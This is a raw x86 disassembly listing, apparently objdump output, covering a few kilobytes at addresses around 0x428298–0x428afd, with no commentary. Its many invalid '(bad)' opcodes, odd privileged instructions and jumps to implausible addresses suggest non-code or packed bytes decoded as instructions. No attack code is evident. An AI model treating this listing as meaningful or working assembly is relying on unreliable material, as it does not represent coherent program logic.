  428298:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  42829f:	add    dh,al
  4282a1:	mov    eax,ebx
  4282a3:	xor    DWORD PTR [ebx],0x35008dbc
  4282a9:	mov    ecx,DWORD PTR [edi]
  4282ab:	sbb    al,0x18
  4282ad:	inc    ebp
  4282ae:	xrelease mov DWORD PTR [ebx],0x188546f4
  4282b5:	clc    
  4282b6:	(bad)  
  4282b7:	cmp    BYTE PTR [edx-0x64],dh
  4282ba:	lea    ecx,[ecx+0x45ffe838]
  4282c0:	mov    ecx,esp
  4282c2:	fadd   st,st(6)
  4282c4:	dec    ebp
  4282c5:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4282cb:	out    0x1,eax
  4282cd:	inc    ebp
  4282ce:	lea    ebp,ds:0xc8ffc6ff
  4282d4:	enter  0xa33,0xc6
  4282d8:	push   ebp
  4282d9:	leave  
  4282da:	(bad)  
  4282db:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4282e1:	add    BYTE PTR [ebp+0x44],al
  4282e4:	mov    eax,esp
  4282e6:	mov    WORD PTR [esi+0x43398300],?
  4282ec:	psubusw mm4,QWORD PTR [eax-0x78]
  4282f0:	add    BYTE PTR [ebx-0x1303f975],al
  4282f6:	add    BYTE PTR [ebp+0x1],0xf3
  4282fa:	add    BYTE PTR [ebp+0x38],al
  4282fd:	in     eax,dx
  4282fe:	inc    ebp
  4282ff:	inc    ebp
  428300:	mov    esp,ebx
  428302:	add    BYTE PTR [ebp+0x0],0xee
  428306:	mov    DWORD PTR [ebp-0x48],eax
  428309:	sub    eax,0x2e00454f
  42830e:	js     0x428355
  428310:	data16 js 0x428298
  428313:	idiv   bh
  428315:	inc    esp
  428316:	(bad)  
  428317:	fadd   st(7),st
  428319:	mov    dh,0x89
  42831b:	and    DWORD PTR [esi+0x43],0xffffffff
  42831f:	fld    DWORD PTR [ebx-0x767cc078]
  428325:	pop    es
  428326:	push   0x8d45ffec
  42832b:	in     eax,dx
  42832c:	inc    DWORD PTR [ebp-0x77]
  42832f:	loopne 0x42839b
  428331:	inc    ebp
  428332:	jmp    esp
  428334:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428338:	mov    DWORD PTR [ebp+0x6c],eax
  42833b:	(bad)  
  42833d:	inc    ebp
  42833e:	(bad)  
  42833f:	call   0xe7cbc850
  428344:	outs   dx,BYTE PTR ds:[esi]
  428345:	inc    ebp
  428346:	(bad)  
  428347:	js     0x4282cc
  428349:	div    BYTE PTR ds:0x70bc8944
  42834f:	mov    dh,0xff
  428351:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  428358:	jb     0x4282dd
  42835a:	dec    DWORD PTR [eax]
  42835c:	mov    ebp,esp
  42835e:	test   WORD PTR [ebp-0x1],ax
  428365:	inc    ebp
  428366:	ror    BYTE PTR [ebx-0x117a279a],0xff
  42836d:	adc    edi,edi
  42836f:	mov    ecx,esi
  428371:	mov    eax,DWORD PTR [eax]
  428373:	cmp    BYTE PTR [esi-0x1],ah
  428376:	test   DWORD PTR [ebx],edi
  428378:	push   DWORD PTR [ebp-0x1]
  42837b:	mov    DWORD PTR [esi-0x48],ebp
  42837e:	add    BYTE PTR [ebp+0x66],al
  428381:	jmp    0x428308
  428383:	pushf  
  428384:	dec    DWORD PTR [ebx-0x7f9c0301]
  42838a:	add    BYTE PTR [ecx],al
  42838c:	data16 add BYTE PTR [ebp-0x7a00c8],al
  428393:	add    al,al
  428395:	add    BYTE PTR [esi+0x45],ah
  428398:	test   DWORD PTR [ebx+0xff7cff],ecx
  42839e:	dec    esp
  42839f:	mov    DWORD PTR [eax],eax
  4283a1:	mov    esp,DWORD PTR [esi-0x4]
  4283a4:	inc    ebp
  4283a5:	cmp    BYTE PTR [eax+0x4701],0x38
  4283ac:	mov    DWORD PTR [ecx-0x7e],esp
  4283af:	add    BYTE PTR [edi-0x73],al
  4283b2:	push   0xffffffd1
  4283b4:	mov    WORD PTR [ebp+0x64],ax
  4283b8:	(bad)  
  4283b9:	call   eax
  4283bb:	mov    esp,eax
  4283bd:	data16 icebp 
  4283bf:	test   DWORD PTR [ebp-0x1],eax
  4283c2:	(bad)  
  4283c4:	out    0xc0,eax
  4283c6:	lea    esp,[esi-0x30]
  4283c9:	test   DWORD PTR [edx+0x43ff80ff],ecx
  4283cf:	inc    edi
  4283d0:	jmp    0x75ff:0x40858866
  4283d7:	dec    DWORD PTR [ebp-0x7a992f40]
  4283dd:	test   esi,edi
  4283df:	(bad)  
  4283e0:	(bad)  
  4283e1:	inc    DWORD PTR [ebp-0x9901b9]
  4283e7:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  4283ed:	rcl    BYTE PTR [ecx+0x66],0x33
  4283f1:	test   DWORD PTR [ebx+0xff72ff],edi
  4283f7:	inc    edi
  4283f8:	ret    
  4283f9:	mov    ax,WORD PTR [ebp-0x3f0004]
  428400:	push   eax
  428401:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428408:	add    BYTE PTR [ebx-0x764ff439],al
  42840e:	push   DWORD PTR [esi+0x1]
  428411:	inc    DWORD PTR [eax]
  428413:	mov    eax,0xff99ff
  428418:	or     BYTE PTR [ecx-0x7a87bb],cl
  42841e:	jne    0x4283d8
  428420:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  42842a:	mov    ecx,0xd74fb8
  42842f:	add    cl,al
  428431:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428437:	or     DWORD PTR [ebx+0x558966ec],0x7e
  42843e:	(bad)  
  42843f:	push   ebp
  428441:	mov    eax,0x8c2789
  428446:	ret    0x6689
  428449:	adc    BYTE PTR [ebp+0x4c],0x8d
  42844d:	add    bl,bl
  42844f:	mov    WORD PTR [ebp-0x70],ax
  428453:	(bad)  
  428454:	ret    0x660d
  428457:	or     BYTE PTR [ebp-0x77],dl
  42845a:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  428461:	in     al,0x89
  428463:	(bad)  
  428464:	xchg   esi,eax
  428465:	aam    0xcf
  428467:	call   0x45dafcf5
  42846c:	dec    edx
  42846d:	pop    ecx
  42846e:	mov    edx,DWORD PTR [eax]
  428470:	repnz push bp
  428473:	or     BYTE PTR [ebx+0x5510663b],0x49
  42847a:	(bad)  
  42847b:	repnz xor eax,0xa0898945
  428481:	mov    ah,0x89
  428483:	jmp    DWORD PTR [edx+0x66b0418d]
  428489:	inc    DWORD PTR [ebp+0x50]
  42848c:	add    DWORD PTR [ebp-0x5],0xffffffbe
  428490:	mov    DWORD PTR [eax],ecx
  428492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428493:	pop    es
  428494:	inc    ecx
  428495:	(bad)  
  428496:	cbw    
  428498:	inc    ebp
  428499:	xor    ah,BYTE PTR [esi+0x3]
  42849c:	dec    ebp
  42849d:	push   eax
  42849e:	inc    bp
  4284a0:	jge    0x428425
  4284a2:	mov    esp,DWORD PTR [esi-0x18]
  4284a5:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4284ab:	add    DWORD PTR [ebx],esi
  4284ad:	add    BYTE PTR [ebx],al
  4284af:	test   DWORD PTR [ebx],esi
  4284b1:	(bad)  
  4284b2:	inc    WORD PTR [ebp+0x0]
  4284b6:	mov    eax,DWORD PTR [eax]
  4284b8:	call   0x88983bed
  4284bd:	mov    esi,eax
  4284bf:	clc    
  4284c0:	ret    
  4284c1:	rol    cl,0xa
  4284c4:	mov    DWORD PTR ds:0x7c0ec88,esi
  4284ca:	mov    edx,edi
  4284cc:	pushf  
  4284cd:	pop    es
  4284ce:	jmp    FWORD PTR [edx+0x66]
  4284d1:	add    BYTE PTR [ebp-0x990175],al
  4284d7:	inc    ebp
  4284d8:	test   DWORD PTR [ebx-0x2f000202],eax
  4284de:	push   ebp
  4284df:	mov    edi,eax
  4284e1:	mov    dh,BYTE PTR [eax+0x266ff51]
  4284e7:	push   ebp
  4284e8:	add    BYTE PTR [ebx-0x764b1777],al
  4284ee:	dec    DWORD PTR [esi+0x661851e8]
  4284f4:	add    BYTE PTR [ebp-0x7b],dl
  4284f7:	cmp    esi,0xfffffffb
  4284fa:	dec    DWORD PTR [ecx+0x51fe9285]
  428500:	jmp    DWORD PTR [esi-0x75]
  428503:	push   ebp
  428504:	hlt    
  428505:	data16 (bad) 
  428507:	dec    ebp
  428508:	ret    
  428509:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42850f:	lea    edx,[eax-0x1]
  428512:	jne    0x4284e5
  428514:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42851a:	dec    BYTE PTR [ecx+0x51559eff]
  428520:	mov    DWORD PTR [esi-0x4c],esp
  428523:	push   ebp
  428524:	jmp    DWORD PTR [esi-0x18]
  428527:	inc    ebp
  428528:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42852e:	(bad)  
  42852f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428530:	inc    eax
  428532:	test   DWORD PTR [esi-0x2],esp
  428535:	inc    ebp
  428536:	dec    DWORD PTR [ebp-0x760bde75]
  42853c:	(bad)  
  42853d:	test   al,0xc3
  42853f:	mov    DWORD PTR [ebp-0x769b56],ecx
  428545:	lods   al,BYTE PTR ds:[esi]
  428546:	push   eax
  428547:	inc    ebp
  428548:	jne    0x428559
  42854a:	dec    DWORD PTR [ebp+0x8]
  42854d:	mov    eax,DWORD PTR [edi]
  42854f:	sbb    al,0x0
  428551:	(bad)  
  428552:	mov    eax,0xc14fc3
  428557:	mov    DWORD PTR [eax-0x64],edi
  42855a:	inc    bp
  42855c:	test   DWORD PTR [edi],ecx
  42855e:	dec    DWORD PTR [ebp-0x1]
  428561:	xor    eax,edi
  428563:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  428569:	inc    ebp
  42856a:	xor    DWORD PTR [ebx],0x3f
  42856d:	mov    WORD PTR [ebp-0x1bc],ax
  428574:	lea    ecx,[ecx-0x767702]
  42857a:	inc    esi
  42857b:	(bad)  
  42857c:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  428583:	pushf  
  428584:	rol    DWORD PTR [ebp-0x72019a],0xff
  42858b:	add    bh,bh
  42858d:	add    BYTE PTR [edi],cl
  42858f:	test   DWORD PTR [eax],eax
  428591:	(bad)  
  428592:	dec    WORD PTR [ebp-0xff002d]
  428599:	mov    DWORD PTR [eax+edi*4+0x0],edi
  42859d:	jmp    DWORD PTR [esi-0x73]
  4285a0:	lea    esi,[eax+0x50ffffff]
  4285a6:	fadd   QWORD PTR [ebp+0x0]
  4285a9:	xor    esp,DWORD PTR [esi+0x3]
  4285ac:	lea    edx,[eax-0x1]
  4285af:	test   edi,edi
  4285b1:	dec    DWORD PTR [ebp-0x1]
  4285b4:	mov    edi,edi
  4285b6:	dec    eax
  4285b7:	clc    
  4285b8:	call   DWORD PTR [ebp-0x73]
  4285bb:	lea    esi,[eax+0x51ffff88]
  4285c1:	lea    ecx,[ebp-0x78]
  4285c4:	test   WORD PTR [ebp-0x2],ax
  4285cb:	popf   
  4285cc:	push   eax
  4285cd:	add    BYTE PTR [ecx-0x77],dl
  4285d0:	xor    edi,DWORD PTR [eax-0x7236007d]
  4285d6:	cwde   
  4285d7:	mov    al,0x32
  4285d9:	inc    DWORD PTR [ebx]
  4285db:	push   eax
  4285dc:	push   ecx
  4285dd:	inc    ebp
  4285de:	shl    BYTE PTR [ebx],1
  4285e0:	lea    eax,[ebx]
  4285e2:	call   DWORD PTR [eax-0x1]
  4285e5:	test   DWORD PTR [ebx],esi
  4285e7:	inc    DWORD PTR [eax-0x1]
  4285ea:	(bad)  
  4285eb:	(bad)  
  4285ec:	(bad)  
  4285ed:	clc    
  4285ee:	call   DWORD PTR [ebp+0x50]
  4285f1:	jmp    0xcb876b
  4285f6:	inc    esp
  4285f7:	jnp    0x4285f8
  4285f9:	add    BYTE PTR [ecx-0x484f73],cl
  4285ff:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428605:	mov    eax,DWORD PTR [ecx]
  428607:	data16 add BYTE PTR [ebp-0xb50077],al
  42860e:	inc    eax
  428610:	lea    esp,[esi+0x14]
  428613:	test   DWORD PTR [ecx-0xb301],ecx
  428619:	inc    edi
  42861a:	(bad)  
  42861b:	dec    si
  42861d:	test   edi,edi
  42861f:	(bad)  
  428620:	cmp    eax,0xc74f73ff
  428625:	mov    edx,DWORD PTR [edx-0x7d]
  428628:	push   DWORD PTR [ebx+0x56328939]
  42862e:	(bad)  
  42862f:	call   FWORD PTR [esi-0x47]
  428632:	inc    DWORD PTR ds:0x893c00ea
  428638:	(bad)  
  428639:	pop    eax
  42863a:	mov    ah,0xff
  42863c:	(bad)  
  42863d:	mov    ecx,0x5745
  428642:	dec    DWORD PTR [ecx-0xf7a501]
  428648:	(bad)  
  428649:	mov    ecx,0x456108
  42864e:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  428654:	test   BYTE PTR [ebp-0x72ff23fd],cl
  42865a:	inc    BYTE PTR gs:[eax]
  42865d:	inc    DWORD PTR [ebp-0x73]
  428660:	cmp    dh,bh
  428662:	pushf  
  428663:	inc    edi
  428665:	mov    ebx,eax
  428667:	hlt    
  428668:	test   DWORD PTR [ecx-0xbab708],ecx
  42866e:	cmp    al,0xbe
  428670:	pushf  
  428671:	or     bh,al
  428673:	pop    es
  428674:	lock into 
  428676:	test   eax,eax
  428678:	clc    
  428679:	mov    ebx,0x387245
  42867e:	lahf   
  42867f:	retf   
  428680:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  428686:	add    edi,edi
  428688:	add    BYTE PTR [ecx+0x45],dl
  42868b:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  428692:	mov    edx,DWORD PTR [ecx-0x74]
  428695:	inc    DWORD PTR [eax]
  428697:	cld    
  428698:	mov    eax,DWORD PTR [ebp-0x6f0175]
  42869e:	add    BYTE PTR [ebp-0x1b0177],al
  4286a4:	jge    0x4286eb
  4286a6:	test   DWORD PTR [ebx+0xff9875],ecx
  4286ac:	sbb    BYTE PTR [esi+0x55],ah
  4286af:	xchg   ebp,eax
  4286b0:	call   0x4281b4
  4286b5:	push   edi
  4286b6:	inc    ebp
  4286b7:	mov    dx,WORD PTR [ebp-0xfc0075]
  4286be:	cmp    al,0x85
  4286c0:	ud0    eax,DWORD PTR [ebp-0x1]
  4286c4:	test   DWORD PTR [edi+0x74],ecx
  4286c7:	dec    edi
  4286c8:	inc    DWORD PTR [ebp-0xf70004]
  4286ce:	dec    DWORD PTR [edi-0x75]
  4286d1:	dec    edi
  4286d2:	cld    
  4286d3:	test   DWORD PTR [eax+0xff01ff],eax
  4286d9:	icebp  
  4286da:	add    BYTE PTR [edi-0x3a],cl
  4286dd:	test   ebx,eax
  4286df:	inc    BYTE PTR [ebp-0x1]
  4286e2:	jne    0x4286e4
  4286e4:	mov    eax,DWORD PTR [eax]
  4286e6:	cld    
  4286e7:	xor    BYTE PTR [ecx+0x500155],cl
  4286ed:	push   ebp
  4286ee:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4286f4:	add    BYTE PTR [ebp+0x35e90f50],al
  4286fa:	add    al,BYTE PTR [eax]
  4286fc:	add    BYTE PTR [ebx-0x38fe4f80],al
  428702:	add    ah,ch
  428704:	or     BYTE PTR [ebp+0x4501f845],dh
  42870a:	jmp    0xde8a07
  42870f:	(bad)  
  428710:	nop    ecx
  428713:	test   DWORD PTR [ebp+0x4502f8],eax
  428719:	cmp    cl,BYTE PTR [ebp-0x64]
  42871c:	mov    eax,edi
  42871e:	mov    ebx,DWORD PTR [eax+edx*2]
  428721:	add    eax,0x45fef885
  428726:	dec    DWORD PTR [ebx+0x339445]
  42872c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428732:	dec    DWORD PTR [ebx-0x460f0375]
  428738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428739:	add    esi,edi
  42873b:	add    bh,bh
  42873d:	rdpmc  
  42873f:	add    BYTE PTR [ebx],0x1
  428742:	mov    DWORD PTR [eax],eax
  428744:	add    al,0x45
  428746:	dec    DWORD PTR [ecx-0x360b3373]
  42874c:	dec    DWORD PTR [esi]
  42874e:	push   eax
  42874f:	jne    0x428796
  428751:	mov    esi,DWORD PTR [ebx]
  428753:	cld    
  428754:	add    ebp,ebx
  428756:	push   eax
  428757:	inc    DWORD PTR [ebp-0x75]
  42875a:	add    eax,0x800e4
  42875f:	add    BYTE PTR [ebx-0x7f7403bf],cl
  428765:	mov    DWORD PTR [ecx],eax
  428767:	sbb    al,0x0
  428769:	leave  
  42876a:	test   DWORD PTR [edi-0x2],eax
  42876d:	jne    0x42876e
  42876f:	call   0xff437274
  428774:	xor    BYTE PTR [ebp+0x4d],al
  428777:	mov    edi,edi
  428779:	enter  0x8,0x4d
  42877d:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  428783:	mov    eax,DWORD PTR [eax]
  428785:	cld    
  428786:	add    DWORD PTR [ecx],ebx
  428788:	inc    ebp
  428789:	dec    ebp
  42878a:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  428790:	inc    eax
  428791:	dec    DWORD PTR [ecx-0x270375]
  428797:	add    BYTE PTR [ebx-0x39d72701],cl
  42879d:	xchg   ecx,eax
  42879e:	ret    
  42879f:	add    BYTE PTR [ebp-0x830075],al
  4287a5:	add    BYTE PTR [ebp-0x75],al
  4287a8:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4287ae:	lea    edi,[edi-0xc]
  4287b1:	add    bh,bh
  4287b3:	mov    edx,DWORD PTR [eax-0x7b]
  4287b6:	inc    ebp
  4287b7:	rdpmc  
  4287b9:	jne    0x4287be
  4287bb:	add    BYTE PTR [eax-0x75],dl
  4287be:	inc    ebp
  4287bf:	clc    
  4287c0:	add    eax,0x400009
  4287c5:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4287cb:	mov    eax,DWORD PTR [ecx]
  4287cd:	in     al,dx
  4287ce:	add    dh,al
  4287d0:	test   ebx,eax
  4287d2:	inc    BYTE PTR [ebp-0xff0001]
  4287d8:	add    BYTE PTR [ebp-0x43],al
  4287db:	cmp    esi,0xfffffff8
  4287de:	(bad)  
  4287df:	push   DWORD PTR [eax]
  4287e1:	add    BYTE PTR [ebp-0x3a],dl
  4287e4:	test   ebx,eax
  4287e6:	je     0x42876d
  4287e8:	mov    edi,edi
  4287ea:	sbb    al,0xff
  4287ec:	test   DWORD PTR gs:[eax],eax
  4287ef:	(bad)  
  4287f0:	js     0x4287f1
  4287f2:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4287f8:	sub    eax,ebx
  4287fa:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428800:	add    eax,DWORD PTR [eax]
  428802:	dec    ebp
  428803:	push   eax
  428804:	mov    al,BYTE PTR [ebp+0x1]
  428807:	mov    eax,DWORD PTR [ebp-0x68]
  42880a:	mov    eax,DWORD PTR [eax]
  42880c:	sbb    bh,al
  42880e:	or     ah,dh
  428810:	dec    ebp
  428811:	inc    DWORD PTR [eax+0x4]
  428814:	push   ecx
  428815:	add    BYTE PTR [edx-0x1],dh
  428818:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42881e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428828:	add    ecx,DWORD PTR [ecx-0x1be77477]
  42882e:	push   ecx
  42882f:	cmp    BYTE PTR [ebx],al
  428831:	inc    ebp
  428832:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428838:	(bad)  
  428839:	(bad)  
  42883a:	in     al,0xff
  42883c:	add    BYTE PTR [ebp+0x0],al
  42883f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428845:	add    al,bh
  428847:	(bad)  
  428848:	jmp    0x8d85:0x74b0558d
  42884f:	dec    DWORD PTR [eax]
  428851:	call   DWORD PTR [ebp-0x7b]
  428854:	mov    edi,esi
  428856:	lock call DWORD PTR [ebp-0x75]
  42885a:	mov    esi,esp
  42885c:	mov    ah,0xc6
  42885e:	mov    bh,0xc3
  428860:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428866:	add    DWORD PTR [eax],0x450050ff
  42886c:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428872:	inc    edi
  428874:	push   esp
  428876:	jmp    0xcd00:0x680481ff
  42887d:	mov    DWORD PTR [ebx],esi
  42887f:	clc    
  428880:	cmp    edi,0xff9cff3b
  428886:	jne    0x428890
  428888:	mov    eax,eax
  42888a:	add    esi,DWORD PTR [eax]
  42888c:	int3   
  42888d:	inc    ebp
  42888e:	cmp    al,0x83
  428890:	add    BYTE PTR [eax],bl
  428892:	adc    DWORD PTR [ebx+0x768b5055],eax
  428898:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  42889e:	mov    edi,eax
  4288a0:	cmp    BYTE PTR [ebp+0x45],cl
  4288a3:	jmp    0x428830
  4288a5:	mov    ebx,DWORD PTR [esp+ebp*8]
  4288a8:	inc    ebp
  4288a9:	or     al,0x2
  4288ab:	dec    DWORD PTR [ebp+0x18]
  4288ae:	jne    0x428905
  4288b0:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4288b6:	mov    edi,DWORD PTR [ebx]
  4288b8:	in     al,0x50
  4288ba:	xchg   ecx,eax
  4288bb:	jmp    0x342d7c0
  4288c0:	adc    al,0x8b
  4288c2:	inc    ebp
  4288c3:	mov    al,ds:0x8b04008b
  4288c8:	push   ebp
  4288c9:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4288cf:	push   ebp
  4288d0:	test   DWORD PTR [ebx-0x2800d701],ecx
  4288d6:	inc    ebp
  4288d7:	dec    ebp
  4288d8:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4288de:	mov    DWORD PTR [eax],0xe9ff00f4
  4288e4:	add    al,0x0
  4288e6:	add    BYTE PTR [eax],al
  4288e8:	mov    eax,edx
  4288ea:	push   eax
  4288eb:	rol    DWORD PTR [ebp-0xf0177],1
  4288f1:	bound  eax,QWORD PTR [ebp+0x50]
  4288f4:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4288fa:	add    BYTE PTR [ecx+0x558df0ff],cl
  428900:	mov    al,0xf
  428902:	test   DWORD PTR [edx],edx
  428904:	call   DWORD PTR [ebp-0x7a0001]
  42890a:	(bad)  
  42890b:	loop   0x42890c
  42890d:	jnp    0xc6987d13
  428913:	mov    eax,ebx
  428915:	cmp    al,0x8b
  428917:	(bad)  
  428918:	cld    
  428919:	shr    esi,0xc
  42891c:	add    dl,al
  42891e:	push   eax
  42891f:	lea    eax,[ebp-0x1]
  428922:	mov    edx,esi
  428924:	cwde   
  428925:	cli    
  428926:	add    BYTE PTR [ebp+0x1ffff8ff],al
  42892c:	or     BYTE PTR [eax],cl
  42892e:	inc    ebp
  42892f:	dec    ebp
  428930:	inc    DWORD PTR [ebx+0x74803914]
  428936:	add    DWORD PTR [ebx+0x451800],ecx
  42893c:	call   DWORD PTR [eax+edx*1]
  42893f:	add    ecx,DWORD PTR [ebp-0x34]
  428942:	push   edi
  428943:	adc    al,0x8
  428945:	mov    edx,DWORD PTR [ebp-0x14]
  428948:	mov    ecx,DWORD PTR [ebp+0x18]
  42894b:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  42894f:	inc    DWORD PTR [eax+esi*8]
  428952:	inc    ebp
  428953:	stos   BYTE PTR es:[edi],al
  428954:	mov    edx,DWORD PTR [ebp-0x4]
  428957:	add    DWORD PTR [ebp-0x1c],eax
  42895a:	mov    edx,DWORD PTR [ebp-0x70]
  42895d:	cmp    eax,DWORD PTR [eax]
  42895f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428960:	mov    eax,DWORD PTR [eax]
  428962:	cld    
  428963:	jae    0x4288e5
  428965:	add    eax,DWORD PTR [ecx]
  428967:	clc    
  428968:	add    BYTE PTR [eax+0x30],dl
  42896b:	mov    DWORD PTR [ecx],esi
  42896d:	clc    
  42896e:	pop    ds
  42896f:	inc    ebp
  428970:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  428976:	(bad)  
  428977:	push   DWORD PTR [edi]
  428979:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  42897f:	(bad)  
  428980:	jae    0x428981
  428982:	mov    eax,DWORD PTR [ebp-0x740175]
  428988:	sub    eax,DWORD PTR [eax]
  42898a:	add    eax,DWORD PTR [eax]
  42898c:	mov    DWORD PTR [ecx+0x5f],eax
  42898f:	mov    DWORD PTR [ebx-0x4],ebx
  428992:	ret    0xff
  428995:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  42899b:	ret    
  42899c:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4289a2:	add    BYTE PTR [ebp-0x7d],al
  4289a5:	mov    DWORD PTR [eax],eax
  4289a7:	add    al,0x84
  4289a9:	inc    DWORD PTR [ecx]
  4289ab:	lea    eax,[eax]
  4289ad:	hlt    
  4289ae:	sar    bh,cl
  4289b0:	test   BYTE PTR [eax+0x1],dl
  4289b3:	inc    ebp
  4289b4:	add    BYTE PTR [ebx],dh
  4289b6:	test   BYTE PTR [ebx],0x84
  4289b9:	push   eax
  4289ba:	add    BYTE PTR [ebp+0x0],al
  4289bd:	add    eax,0x86
  4289c2:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4289c8:	add    BYTE PTR [ecx],al
  4289ca:	add    BYTE PTR [eax],al
  4289cc:	mov    esi,0x550030
  4289d1:	mov    ecx,DWORD PTR [edi]
  4289d3:	cld    
  4289d4:	fidiv  DWORD PTR [ebp+0x0]
  4289d7:	mov    edi,DWORD PTR [ecx]
  4289d9:	xor    BYTE PTR [eax+eax*1],0x84
  4289dd:	add    eax,DWORD PTR [eax]
  4289df:	sbb    BYTE PTR [eax],al
  4289e1:	jne    0x428994
  4289e3:	mov    eax,DWORD PTR [ecx]
  4289e5:	sbb    BYTE PTR [eax],al
  4289e7:	mov    DWORD PTR [ebp-0x1],esp
  4289ea:	add    BYTE PTR [eax+0x30e45ca],bh
  4289f0:	ret    0xb7fc
  4289f3:	dec    ebp
  4289f4:	or     al,0x89
  4289f6:	dec    ebp
  4289f7:	cld    
  4289f8:	cmovne ecx,DWORD PTR [eax-0x75]
  4289fc:	add    edi,esp
  4289fe:	seto   BYTE PTR [esi-0x72ffffff]
  428a05:	inc    ebp
  428a06:	adc    al,0x8b
  428a08:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  428a0f:	cmp    DWORD PTR [edi+0x72],edx
  428a12:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428a18:	gs cmp al,0x0
  428a1b:	je     0x4289f3
  428a1d:	push   eax
  428a1e:	sar    BYTE PTR [eax],1
  428a20:	mov    bh,0x3e
  428a22:	push   cs
  428a23:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428a29:	add    DWORD PTR [ecx+0x12],ebp
  428a2c:	dec    edx
  428a2d:	(bad)  
  428a2e:	mov    eax,edx
  428a30:	in     al,dx
  428a31:	adc    DWORD PTR [ecx],esi
  428a33:	pop    esi
  428a34:	inc    ecx
  428a35:	leave  
  428a36:	or     DWORD PTR [eax],ebx
  428a38:	gs push ebp
  428a3a:	add    ah,ch
  428a3c:	into   
  428a3d:	in     al,dx
  428a3e:	enter  0xb756,0xf0
  428a42:	push   cs
  428a43:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  428a4d:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  428a53:	jnp    0x74430f5b
  428a59:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  428a5f:	add    BYTE PTR [edi],cl
  428a61:	mov    edi,DWORD PTR [ecx-0x78]
  428a64:	ltr    WORD PTR [ecx-0x7b]
  428a68:	dec    DWORD PTR [edi]
  428a6a:	clc    
  428a6b:	out    0x45,eax
  428a6d:	add    BYTE PTR [eax],cl
  428a6f:	cmp    ebx,0xffffff8c
  428a72:	jge    0x428a74
  428a74:	jb     0x428a86
  428a76:	je     0x518af6
  428a7c:	pop    edx
  428a7d:	push   esi
  428a7e:	mov    ecx,DWORD PTR [edi]
  428a80:	in     al,dx
  428a81:	rol    DWORD PTR [ebp+0x0],1
  428a84:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  428a8b:	cmp    DWORD PTR [ecx],0xfffffff0
  428a8e:	hlt    
  428a8f:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428a95:	(bad)  
  428a97:	push   eax
  428a98:	jns    0xb8426f16
  428a9e:	lock push cs
  428aa0:	ror    edx,0x3
  428aa3:	test   BYTE PTR [ecx+0x5500e800],cl
  428aa9:	dec    eax
  428aaa:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  428aae:	(bad)  
  428aaf:	mov    esi,0x7f33ff5f
  428ab4:	inc    eax
  428ab5:	test   DWORD PTR [edx],eax
  428ab7:	je     0x428a79
  428ab9:	mov    ecx,ecx
  428abb:	adc    DWORD PTR [ebp-0xc],0xffffffec
  428abf:	and    eax,DWORD PTR [eax+0xf0103]
  428ac5:	jp     0x428ab3
  428ac7:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  428acb:	add    edx,DWORD PTR [edi+0x74]
  428ace:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428ad4:	add    BYTE PTR [ebp-0x74c48bbb],al
  428ada:	je     0x428a5f
  428adc:	cmp    eax,edi
  428ade:	js     0x428b03
  428ae0:	add    eax,0xeb0fc003
  428ae5:	jns    0x428a72
  428ae7:	vmread DWORD PTR [ecx+0x45],ebx
  428aeb:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428af1:	adc    al,0x8b
  428af3:	jge    0x428b09
  428af5:	mov    edi,DWORD PTR [eax-0x4]
  428af8:	add    edi,DWORD PTR [edi]
  428afa:	or     bh,bh
  428afc:	push   ebp
  428afd:	push   es
